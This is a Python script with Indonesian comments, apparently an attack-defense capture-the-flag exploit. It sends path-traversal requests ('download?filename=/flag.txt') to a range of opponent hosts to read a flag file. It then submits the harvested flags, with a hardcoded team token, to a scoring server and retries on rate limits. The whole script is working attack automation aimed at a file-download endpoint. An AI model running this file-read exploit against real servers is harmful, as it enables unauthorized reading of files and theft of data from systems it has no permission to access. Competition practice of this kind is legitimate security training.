import requests
import time

ips = []
flags = []
for i in range(1, 7):
    if i == 3:
        continue
    ips.append(f"10.60.{i}.1:12000")

# Ambil flag dari setiap IP
for a in ips:
    try:
        api = requests.get(f"http://{a}/download?filename=/flag.txt", timeout=3)
        if ":(" not in api.text:
            flag = api.text.strip()
            print(f"ip : {a}")
            print(flag)
            flags.append(flag)
    except Exception as e:
        print(f"[!] Gagal menghubungi {a}: {e}")

print("Flags ditemukan:")
print(flags)

# Submit flag ke server pusat
url = 'http://10.10.0.1/flags'
headers = {
    'X-Team-Token': '475cdaad49200793',
    'Content-Type': 'application/json'
}

for flag in flags:
    for attempt in range(3):  # Coba maksimal 3 kali kalau 429
        try:
            response = requests.put(url, headers=headers, json=[flag])
            if response.status_code == 200:
                result = response.json()
                for res in result:
                    f = res.get("flag")
                    msg = res.get("msg", "")
                    if "accepted" in msg.lower():
                        print(f"[✓] Flag diterima: {f}")
                        print(f"     Pesan: {msg}")
                    else:
                        print(f"[✗] Flag ditolak: {f}")
                        print(f"     Pesan: {msg}")
                break  # Keluar dari retry loop
            elif response.status_code == 429:
                print(f"[!] Rate limit (429) saat kirim {flag}, tunggu 5 detik...")
                time.sleep(5)
            else:
                print(f"[!] Gagal submit {flag}. Status code: {response.status_code}")
                print(f"     Response: {response.text}")
                break
        except Exception as e:
            print(f"[!] Error submit flag {flag}: {e}")
            break
    time.sleep(1)  # Delay antar flag, untuk hindari 429
